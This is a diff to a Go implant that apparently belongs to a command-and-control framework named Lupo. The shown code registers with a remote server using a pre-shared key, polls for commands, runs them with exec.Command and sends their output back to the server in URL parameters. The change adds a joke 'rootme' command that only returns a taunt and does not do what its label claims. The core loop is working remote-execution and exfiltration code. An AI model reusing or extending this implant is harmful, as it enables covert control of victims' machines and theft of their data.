@@ -31,9 +31,8 @@ type lupoImplant struct {
 
 var implant *lupoImplant
 
-var rootCert string = `-----BEGIN CERTIFICATE-----
-some cert
------END CERTIFICATE-----
+var rootCert string = `some cert here
+
 `
 
 func main() {
@@ -103,7 +102,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 	if implant.id == -1 {
 
 		// Request registration passing a PSK and the register flag as true
-		requestParams = "/?psk=" + implant.psk + "&register=true&update=" + strconv.Itoa(implant.updateInterval)
+		requestParams = "/?psk=" + implant.psk + "&register=true&update=" + strconv.Itoa(implant.updateInterval) + "&functions=" + url.QueryEscape("{\"rootme\":\"roots any system ever, no seriously\"}")
 		requestUrl = connectionString + requestParams
 
 		resp, err := client.Get(requestUrl)
@@ -168,6 +167,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			argS := parsedCmd[1:]
 
 			var data []byte
+			var dataString string
 
 			if err != nil {
 				return
@@ -182,11 +182,19 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 					data, err = exec.Command(cmd, argS...).Output()
 				}
 			} else if cmd != "" {
-				data, err = exec.Command(cmd).Output()
+				if cmd == "rootme" {
+					dataString = "you're not good enough to be root :("
+				} else {
+					data, err = exec.Command(cmd).Output()
+				}
 			}
 
 			// URL encode data from exec output to account for weird characters like newlines in the URL string
-			dataString := url.QueryEscape(string(data))
+			if dataString == "" {
+				dataString = url.QueryEscape(string(data))
+			} else {
+				dataString = url.QueryEscape(string(dataString))
+			}
 
 			// Return a response with our standard auth and include the data parameter with our command output to display in Lupo
 			requestParams = "/?psk=" + implant.psk + "&sessionID=" + strconv.Itoa(implant.id) + "&UUID=" + implant.uuid + "&data=" + dataString
@@ -197,6 +205,7 @@ func ExecLoop(implant *lupoImplant, client *http.Client) {
 			if err != nil {
 				return
 			}
+
 		}
 	}
 }
